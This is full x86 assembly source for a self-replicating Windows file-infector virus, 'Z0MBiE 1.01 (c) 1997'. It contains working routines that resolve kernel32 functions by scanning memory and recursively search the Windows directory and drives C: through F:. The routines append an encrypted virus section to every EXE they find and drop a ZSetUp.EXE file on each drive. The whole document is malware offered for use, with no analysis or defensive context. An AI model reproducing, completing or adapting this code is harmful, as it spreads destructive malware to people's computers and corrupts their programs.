
kernel                  equ     0BFF70000H

FILE_ID                 equ     'Z0'
PORT_ID                 equ     'Z'

                        .386
                        locals
                        jumps
                        .model  flat

extrn                   ExitProcess:PROC
extrn                   MessageBoxA:PROC

                        .data

sux                     db      'mustdie'

                        .code
start:
                        call    codestart

                        lea     ebp, [eax - 401000H]
                        lea     edx, codestart[ebp]
cryptn                  equ     (viriisize-decrsize+3) / 4
                        mov     ecx, cryptn
@@1:                    neg     dword ptr [edx]
                        xor     dword ptr [edx], 12345678h
xorword                 equ     dword ptr $-4
                        sub     edx, -4
                        loop    @@1
                        jmp     codestart

                        align   4
decrsize                equ     $-start

codestart:              lea     ebp, [eax - 401000H]
                        sub     eax, 12345678h
subme                   equ     dword ptr $-4
                        push    eax

                        call    AnalizeKernel

                        call    first

                        in      al, 81h
                        cmp     al, PORT_ID
                        je      exit_to_program

                        in      al, 80h
                        cmp     al, PORT_ID
                        je      infect

                        mov     al, PORT_ID
                        out     80h, al

                        call    ExecExe

exit_to_program:        ret

infect:                 mov     al, -1
                        out     80h, al

                       ; call    _GetModuleHandleA
                       ; push    9
                       ; push    eax
                       ; call    _SetPriorityClass

                        ; infect windows directory

                        lea     edx, infdir[ebp]
                        call    GetWinDir
                        lea     edx, infdir[ebp]
                        call    SetDir
                        call    InfectDir

                        ; recursive infect

                        lea     edx, drive_c[ebp]
                        call    recinfect1st
                        call    createsetup

                        lea     edx, drive_d[ebp]
                        call    recinfect1st
                        call    createsetup

                        lea     edx, drive_e[ebp]
                        call    recinfect1st
                        call    createsetup

                        lea     edx, drive_f[ebp]
                        call    recinfect1st
                        call    createsetup

                        mov     al, PORT_ID
                        out     81h, al


exit_to_mustdie:        push    -1
                        call    _ExitProcess

; --------------------- subprograms -----------------------------------------

createsetup:            lea     edx, zsetup[ebp]
                        call    createfile

                        lea     edx, z[ebp]
                        mov     ecx, z_size
                        call    writefile

                        call    closefile

                        ret

first:                  pop     edi
                        mov     byte ptr [edi-5], 0b9h  ; mov ecx, xxxxxxxx

                        mov     byte ptr start[ebp], 0b9h

                        call    infectfile

                        jmp     exit_to_mustdie

ExecExe:                call    _GetCommandLineA
SW_NORMAL               equ     1
                        push    SW_NORMAL
                        push    eax
                        call    _WinExec
                        ret

recinfect1st:           call    SetDir

recinfect:              call    InfectDir

                        lea     eax, win32_data_thang[ebp]
                        push    eax
                        lea     eax, dirfiles[ebp]
                        push    eax
                        call    _FindFirstFileA
                        mov     edi, eax
                        inc     eax
                        jz      @@nomorefiles

@@processfile:          lea     eax, fileattr[ebp]
                        mov     al, [eax]
                        cmp     al, 10h         ; directory ?
                        jne     @@findnext

                        lea     edx, fullname[ebp]
                        cmp     byte ptr [edx], '.'
                        je      @@findnext
                        call    setdir

                        push    edi
                        lea     edx, fullname[ebp]
                        call    recinfect
                        pop     edi

                        lea     edx, prev_dir[ebp]
                        call    setdir

@@findnext:             lea     eax, win32_data_thang[ebp]
                        push    eax
                        push    edi
                        call    _FindNextFileA

                        or      eax, eax
                        jnz     @@processfile

@@nomorefiles:          ret


nokerneldll:
;nokernelfunc:
nofunction:
exit:                   jmp     $

analizekernel:          mov     esi, kernel
@@1:                   ; cmp     esi, kernel + 040000h
                       ; ja      nokernelfunc
                        lea     edi, kernel_sign[ebp]
                        mov     ecx, kernel_sign_size
                        rep     cmpsb
                        jne     @@1

kernelfound:            sub     esi, kernel_sign_size
                        mov     kernel_call[ebp], esi

                        mov     esi, kernel
                        lodsw
                        cmp     ax, 'ZM'
                        jne     nokerneldll

                        add     esi, 003Ch-2
                        lodsd

                        lea     esi, [esi + eax - 3ch - 4]
                        lodsd
                        cmp     eax, 'EP'
                        jne     nokerneldll

                        add     esi, 78h-4      ; esi=.edata

                        lodsd
                        add     eax, kernel + 10h
                        xchg    esi, eax

                        lodsd
                        lodsd
                        lodsd
                        mov     funcnum[ebp], eax


                        lodsd
                        add     eax, kernel
                        mov     entrypointptr[ebp], eax

                        lodsd
                        add     eax, kernel
                        mov     nameptr[ebp], eax

                        lodsd
                        add     eax, kernel
                        mov     ordinalptr[ebp], eax

                        lea     edx, names[ebp]
                        lea     edi, fns[ebp]

@@1:                    push    edi
                        call    findfunction
                        pop     edi

                        inc     edi             ; 68
                        stosd
                        add     edi, 6          ; jmp kernel_call[ebp]

                        mov     edx, esi

                        cmp     byte ptr [esi], 0
                        jne     @@1

                        ret

findfunction:           mov     ecx, 12345678h
funcnum                 equ     dword ptr $-4
                        xor     ebx, ebx

findnextfunc:           mov     esi, edx

                        mov     edi, [ebx + 12345678h]
nameptr                 equ     dword ptr $-4
                        add     edi, kernel

@@2:                    cmpsb
                        jne     @@1

                        cmp     byte ptr [esi-1], 0
                        jne     @@2

                        ; found

                        shr     ebx, 1
                        movzx   eax, word ptr [ebx + 12345678h]
ordinalptr              equ     dword ptr $-4
                        shl     eax, 2
                        mov     eax, [eax + 12345678h]
entrypointptr           equ     dword ptr $-4
                        add     eax, kernel

                        ret

@@1:                    add     ebx, 4
                        loop    findnextfunc

                        jmp     nofunction


infectdir:              lea     eax, win32_data_thang[ebp]
                        push    eax
                        lea     eax, exefiles[ebp]
                        push    eax
                        call    _FindFirstFileA

                        mov     searchhandle[ebp], eax
                        inc     eax
                        jz      @@exit

@@next:                 call    infectfile

                        lea     eax, win32_data_thang[ebp]
                        push    eax
                        push    12345678h
searchhandle            equ     dword ptr $-4
                        call    _FindNextFileA

                        or      eax, eax
                        jnz     @@next

@@exit:                 ret

                        ; input: ECX=file attr
                        ;        EDX=file
                        ; output: EAX=handle

openfile:               push    0
                        push    ecx
                        push    3 ; OPEN_EXISTING
                        push    0
                        push    0
                        push    80000000h + 40000000h ; GENERIC_READ + GENERIC_WRITE
                        push    edx
                        call    _CreateFileA
                        mov     handle[ebp], eax
                        ret

                        ; input:  EDX=file
                        ; output: EAX=handle

createfile:             push    0
                        push    ecx
                        push    1 ; CREATE
                        push    0
                        push    0
                        push    80000000h + 40000000h ; GENERIC_READ + GENERIC_WRITE
                        push    edx
                        call    _CreateFileA
                        mov     handle[ebp], eax
                        ret

seekfile:               push    0
                        push    0
                        push    edx
                        push    handle[ebp]
                        call    _SetFilePointer
                        ret

closefile:              push    handle[ebp]
                        call    _CloseHandle
                        ret

                        ; input: ECX=bytes to read
                        ;        EDX=buf

readfile:               push    0
                        lea     eax, bytesread[ebp]
                        push    eax
                        push    ecx
                        push    edx
                        push    handle[ebp]
                        call    _ReadFile
                        ret

                        ; input: ECX=bytes to read
                        ;        EDX=buf

writefile:              push    0
                        lea     eax, bytesread[ebp]
                        push    eax
                        push    ecx
                        push    edx
                        push    handle[ebp]
                        call    _WriteFile
                        ret

                        ; input: EDX=offset directory (256 byte)

getdir:                 cld
                        push    edx
                        push    255
                        call    _GetCurrentDirectoryA
                        ret

                        ; input: EDX=directory

setdir:                 push    edx
                        call    _SetCurrentDirectoryA
                        ret

getwindir:              cld
                        push    255
                        push    edx
                        call    _GetWindowsDirectoryA
                        ret

infectfile:             in      al, 82h
                        cmp     al, PORT_ID
                        jne     @@continue

                        lea     eax, fullname[ebp]
                        cmp     dword ptr [eax], 'BM0Z'
                        jne     @@exit

@@continue:             mov     ecx, fileattr[ebp]
                        lea     edx, fullname[ebp]
                        call    openfile

                        inc     eax
                        jz      @@exit

; goto the dword that stores the location of the pe header

                        mov     edx, 3Ch
                        call    seekfile

; read in the location of the pe header

                        mov     ecx, 4
                        lea     edx, peheaderoffset[ebp]
                        call    readfile

; goto the pe header
                        mov     edx, peheaderoffset[ebp]
                        call    seekfile

; read in enuff to calculate the full size of the pe header and object table

                        mov     ecx, 256
                        lea     edx, peheader[ebp]
                        call    readfile

; make sure it is a pe header and is not already infected
                        cmp     dword ptr peheader[ebp],'EP'
                        jne     @@close
                        cmp     word ptr peheader[ebp] + 4ch, FILE_ID
                        je      @@close
                        cmp     dword ptr peheader[ebp] + 52, 00400000h
                        jne     @@close

; go back to the start of the pe header
                        mov     edx, peheaderoffset[ebp]
                        call    seekfile

; read in the whole pe header and object table
                        lea     edx, peheader[ebp]
                        mov     ecx, headersize[ebp]
                        cmp     ecx, maxbufsize
                        ja      @@close
                        call    readfile

                        mov     word ptr peheader[ebp] + 4ch, FILE_ID

; locate offset of object table
                        xor     eax, eax
                        mov     ax, NtHeaderSize[ebp]
                        add     eax, 18h
                        mov     ObjectTableoffset[ebp],eax

; calculate the offset of the last (null) object in the object table
                        mov     esi, ObjectTableoffset[ebp]
                        lea     eax, peheader[ebp]
                        add     esi, eax
                        xor     eax, eax
                        mov     ax, numObj[ebp]
                        mov     ecx, 40
                        xor     edx, edx
                        mul     ecx
                        add     esi, eax

                        inc     numObj[ebp]    ; inc the number of objects

                        lea     edi, newobject[ebp]
                        xchg    edi,esi

; calculate the Relative Virtual Address (RVA) of the new object

                        mov     eax, [edi-5*8+8]
                        add     eax, [edi-5*8+12]
                        mov     ecx, objalign[ebp]
                        xor     edx,edx
                        div     ecx
                        inc     eax
                        mul     ecx
                        mov     RVA[ebp], eax

; calculate the physical size of the new object
                        mov     ecx, filealign[ebp]
                        mov     eax, viriisize
                        xor     edx, edx
                        div     ecx
                        inc     eax
                        mul     ecx
                        mov     physicalsize[ebp],eax

; calculate the virtual size of the new object
                        mov     ecx, objalign[ebp]
                        mov     eax, virtsize
                        xor     edx,edx
                        div     ecx
                        inc     eax
                        mul     ecx
                        mov     virtualsize[ebp],eax

; calculate the physical offset of the new object
                        mov     eax,[edi-5*8+20]
                        add     eax,[edi-5*8+16]
                        mov     ecx, filealign[ebp]
                        xor     edx,edx
                        div     ecx
                        inc     eax
                        mul     ecx
                        mov     physicaloffset[ebp],eax

; update the image size (the size in memory) of the file
                        mov     eax, virtsize
                        add     eax, imagesize[ebp]
                        mov     ecx, objalign[ebp]
                        xor     edx, edx
                        div     ecx
                        inc     eax
                        mul     ecx
                        mov     imagesize[ebp],eax

; copy the new object into the object table
                        mov    ecx, 40/4
                        rep    movsd

; calculate the entrypoint RVA
                        mov    eax, RVA[ebp]

                        mov    ebx, entrypointRVA[ebp]
                        mov    entrypointRVA[ebp], eax

                        sub     eax, ebx

; Set the value needed to return to the host
                        mov     subme[ebp], eax

; go back to the start of the pe header
                        mov     edx, peheaderoffset[ebp]
                        call    seekfile

; write the pe header and object table to the file
                        mov     ecx, headersize[ebp]
                        lea     edx, peheader[ebp]
                        call    writefile

; move to the physical offset of the new object
                        mov     edx, physicaloffset[ebp]
                        call    seekfile

; write the virus code to the new object

                        call    random
                        mov     xorword[ebp], eax

                        lea     edx, start[ebp]
                        mov     ecx, decrsize
                        call    writefile

                        lea     esi, codestart[ebp]
                        lea     edi, buf[ebp]
                        mov     ecx, cryptN
@@1:                    lodsd
                        xor     eax, xorword[ebp]
                        neg     eax
                        stosd
                        loop    @@1

                        lea     edx, buf[ebp]
                        mov     ecx, viriisize-decrsize
                        call    writefile

@@close:                call    closefile

@@exit:                 ret

; --------------------- 32-bit random number generator ----------------------

                        ; output: eax=rnd
                        ;         zf=rnd(2)

random:                 call    random16bit
                        shl     eax, 16

random16bit:            push    ebx
                        mov     bx, 1234h
rndword                 equ     word ptr $-2
                        in      al, 40h
                        xor     bl, al
                        in      al, 40h
                        add     bh, al
                        in      al, 41h
                        sub     bl, al
                        in      al, 41h
                        xor     bh, al
                        in      al, 42h
                        add     bl, al
                        in      al, 42h
                        sub     bh, al
                        mov     rndword[ebp], bx
                        xchg    bx, ax
                        pop     ebx
                        test    al, 1
                        ret

                        ; input:  eax
                        ; output: eax=rnd(eax)
                        ;         zf=rnd(2)

rnd:                    push    ebx
                        push    edx
                        xchg    ebx, eax
                        call    random
                        xor     edx, edx
                        div     ebx
                        xchg    edx, eax
                        pop     edx
                        pop     ebx
                        test    al, 1
                        ret


codesize                equ     $-start

; --------------------- data area -------------------------------------------

kernel_sign:            pushfd                  ; <-- kernel
                        cld
                        push    eax
                        push    ebx
                        push    edx
kernel_sign_size        equ     $-kernel_sign

kernel_call             dd      ?

names:                  db      'ExitProcess',0
                        db      'FindFirstFileA',0
                        db      'FindNextFileA',0
                        db      'CreateFileA',0
                        db      'SetFilePointer',0
                        db      'ReadFile',0
                        db      'WriteFile',0
                        db      'CloseHandle',0
                        db      'GetCurrentDirectoryA',0
                        db      'SetCurrentDirectoryA',0
                        db      'GetWindowsDirectoryA',0
                        db      'GetCommandLineA',0
                        db      'WinExec',0
                        db      'SetPriorityClass',0
                        db      'GetModuleHandleA',0
                        db      0

fns:

def_fn                  macro   name
_&name&:                db      68h
fn_&name&               dd      ?
                        jmp     kernel_call[ebp]
                        endm

def_fn                  ExitProcess
def_fn                  FindFirstFileA
def_fn                  FindNextFileA
def_fn                  CreateFileA
def_fn                  SetFilePointer
def_fn                  ReadFile
def_fn                  WriteFile
def_fn                  CloseHandle
def_fn                  GetCurrentDirectoryA
def_fn                  SetCurrentDirectoryA
def_fn                  GetWindowsDirectoryA
def_fn                  GetCommandLineA
def_fn                  WinExec
def_fn                  SetPriorityClass
def_fn                  GetModuleHandleA


bytesread               dd      ?

drive_c                 db      'C:\',0
drive_d                 db      'D:\',0
drive_e                 db      'E:\',0
drive_f                 db      'F:\',0

exefiles                db      '*.EXE',0
dirfiles                db      '*.',0

prev_dir                db      '..',0

win32_data_thang:
fileattr                dd      0
createtime              dd      0,0
lastaccesstime          dd      0,0
lastwritetime           dd      0,0
filesize                dd      0,0
resv                    dd      0,0
fullname                db      'Z0MB.EXE',256-8 dup (0)
realname                db      256 dup (0)

handle                  dd      ?

peheaderoffset          dd      ?
objecttableoffset       dd      ?

newobject:                      ;1234567  8
oname                   db      '.Z0MBiE',0
virtualsize             dd      0
RVA                     dd      0
physicalsize            dd      0
physicaloffset          dd      0
reserved                dd      0,0,0
objectflags             db      40h,0,0,0c0h

; --------------------- messages --------------------------------------------

                        db 13,10,'Z0MBiE 1.01 (c) 1997',13,10
                        db 'My 2nd virii for mustdie',13,10
                        db 'Tnx to S.S.R.',13,10

m1                      macro   n
                        if      n ge 100000
                        db      n / 10000/10 mod 10 + '0'
                        else
                        db      '.'
                        endif
                        if      n ge 10000
                        db      n /  10000 mod 10 + '0'
                        else
                        db      '.'
                        endif
                        if      n ge 1000
                        db      n /   1000 mod 10 + '0'
                        else
                        db      '.'
                        endif
                        db      n /    100 mod 10 + '0'
                        db      n /     10 mod 10 + '0'
                        db      n /      1 mod 10 + '0',13,10
                        endm

; ===========================================================================

zsetup                  db      '\ZSetUp.EXE',0

z:
include                 z.inc
z_size                  equ     $-z

; ===========================================================================

                        db      13,10
                        db      'code..............'
m1                      codesize
                        db      'viriisize.........'
m1                      viriisize
                        db      'virtsize..........'
m1                      virtsize

peheader:
signature               dd      0
cputype                 dw      0
numObj                  dw      0
                        dd      3 dup (0)
NtHeaderSize            dw      0
Flags                   dw      0
                        dd      4 dup (0)
entrypointRVA           dd      0
                        dd      3 dup (0)
objalign                dd      0
filealign               dd      0
                        dd      4 dup (0)
imagesize               dd      0
headersize              dd      0
peheader_size           equ     $-peheader

                        align   4
viriisize               equ     $-start

infdir                  db      256 dup (?)

maxbufsize              equ     4096
buf                     db      maxbufsize dup (?)

virtsize                equ     $-start

                        end     start
